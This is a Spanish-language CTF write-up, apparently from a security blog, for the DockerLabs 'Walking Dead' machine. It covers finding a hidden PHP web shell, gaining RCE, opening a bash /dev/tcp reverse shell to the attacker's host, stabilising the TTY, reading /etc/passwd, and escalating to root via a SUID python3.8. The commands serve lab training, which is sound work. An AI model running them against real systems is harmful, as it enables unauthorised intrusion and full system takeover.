---
layout: post
title: "Walking Dead - Dockerlabs - Linux - Fácil"
date: 2026-03-08
img: /assets/img/walkingdead/1.png
tags: [DockerLabs, Linux, Easy, RCE, WebShell, SUID, Python, PrivEsc, TTY-Stabilization]
---

Walking Dead (DockerLabs): Explotación de Web Shell oculta y escalada de privilegios mediante abuso de Python 3.8 con bit SUID.

Como ya sabemos, comenzaremos con un escaneo a nuestro objetivo con un script que pueden encontrar en mi perfil. Este realiza un escaneo automatizado de puertos, servicios, versiones, escaneo de directorios web y nos entregará información importante en esta primera fase de reconocimiento.

![reconocimiento](/secnotes/assets/img/walkingdead/scaneo.png)

![nikto](/secnotes/assets/img/walkingdead/scan2.png)

![escaneo de directorios](/secnotes/assets/img/walkingdead/scan3.png)

Este objetivo tiene servicio ssh y web habilitado. Para acceder por el servicio ssh necesitamos almenos un usuario para acceder a él, es por esto que nos centraremos en el servicio web.

Nuestro escaneo automatizado nos detectó una ruta hacia **/hidden** y un documento llamado **backup.txt**. Con esta información vamos a comprobar de que se tratan.

![img4](/secnotes/assets/img/walkingdead/backup.png)

solo un texto en pantalla..

![img5](/secnotes/assets/img/walkingdead/hidden.png)

En este directorio tampoco tenemos algo.

![img6](/secnotes/assets/img/walkingdead/index.png)

En la página principal aparentemente no tenemos nada, pero.. al inspeccionar la página, podemos ver un link oculto.

![vector de ataque](/secnotes/assets/img/walkingdead/link.png)

Al acceder a este link no obtenemos nada (aparentemente)

![vector de ataque](/secnotes/assets/img/walkingdead/shell.png)

En esto punto podemos asumir que estamos ante una *web* *shell*, pero por que?
tenemos un archivo oculto (.) con un nombre quizás como pista (shell) en un directorio ocuto (/hidden)
Antes de asumir las cosas, es mejor probarlas. Como ya vimos en otros laboratorios, podemos intentar RCE en el navegador para probar.

![rce](/secnotes/assets/img/walkingdead/id.png)

ya que podemos lanzar comandos desde el navegador, busquemos que shell tenemos disponible para lanzar una reverse shell y obtener una sesión por consola y buscar el método para elevar nuestros privilegios.

![rce](/secnotes/assets/img/walkingdead/python.png)

![rce shell](/secnotes/assets/img/walkingdead/bash.png)

Tenemos bash para realizar nuestra conexión.

`http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27` 

*Un error común al trabajar con DockerLabs es intentar que la máquina víctima se conecte a nuestra IP de la red local (192.168.x.x). Debido a que el contenedor vive en una red virtual aislada, solo tiene visibilidad de su propia subred. Por lo tanto, la Reverse Shell debe apuntar obligatoriamente a la IP de la interfaz docker0 (generalmente 172.17.0.1)".*

![rce reverse shell](/secnotes/assets/img/walkingdead/rv.png)

ya con la conexión vamos a mejorar la shell 

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

luego mandamos la shell a segundo plano con **CTRL Z** 

y en nuestra shell ponemos `stty raw -echo; fg` ahora al presionar enter volveremos a la shell de la víctima
con este mejoramiento ya no tendremos una shell "tonta" ahora podremos usar las flechas sin que salgan caracteres no deseados.

Ya estamos dentro del servidor, pero tenemos un problema. nuestro usuario (www-data) tiene muy pocos privilegios. Es por esto que buscaremos pivotear a un usuario con más accesos. 

Vamnos a buscar usuarios válidos en el sistema. Miraremos quien tiene un directorio en /home. Esto nos dirá a quien podemos suplantar.. 

`cat /etc/passwd | grep "/home"`

![lectura de usuarios en el sistema](/secnotes/assets/img/walkingdead/cat.png)

Tenemos dos usuarios.. **rick** y **negan**

Antes utilizaremos la vieja confiable.. Buscar el SUID (encontrado en los últimos laboratorios que hemos hecho)

![escalada de privilegios SUID](/secnotes/assets/img/walkingdead/priv.png)

Tenemos un regalo del cielo.. **python 3.8**  , ya sabemos que podemos utilizar python con el SUID para lanzar una shell como root gracias a los permisos heredados.

así que:

`python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'`

y no es magia.. es solo aprovechar una mala configuración.

Los comandos para los permisos heredados pueden verlos en **gtfobins, esta es la bliblia del hacker donde podemos encontrar mucha información valiosa y útil.
>https://gtfobins.org/gtfobins/python/







